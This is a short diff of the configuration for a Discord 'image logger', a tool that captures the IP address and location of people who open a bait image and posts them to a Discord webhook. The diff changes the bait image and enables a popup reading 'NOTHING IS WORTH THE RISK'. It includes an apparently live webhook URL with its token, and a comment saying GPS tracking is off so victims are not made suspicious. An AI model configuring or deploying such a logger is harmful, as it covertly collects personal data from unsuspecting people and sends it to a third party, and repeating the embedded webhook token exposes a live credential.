@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335211041126219841/qPfbBvRZr6qQ2N1BwsLuC8JtxvP_qF2E7UcilGdbMxnilXXbCsJgA1gLUgNQcyT-HIYO",
-    "image": "https://letsenhance.io/static/73136da51c245e80edc6ccfe44888a99/1015f/MainBefore.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/727fc233-3392-45b2-8037-33a6fc8359a9/df8sztx-0f14b79d-37d7-4f22-afed-176f86f6da33.jpg/v1/fill/w_1280,h_623,q_75,strp/nothing_is_worth_the_risk_by_amongosgame_df8sztx-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NjIzIiwicGF0aCI6IlwvZlwvNzI3ZmMyMzMtMzM5Mi00NWIyLTgwMzctMzNhNmZjODM1OWE5XC9kZjhzenR4LTBmMTRiNzlkLTM3ZDctNGYyMi1hZmVkLTE3NmY4NmY2ZGEzMy5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.1MnOJXCpGFZchZ0n5tvho4DjdKZ6gQa5A86QdQlIRw0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "NOTHING IS WORTH THE RISK", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
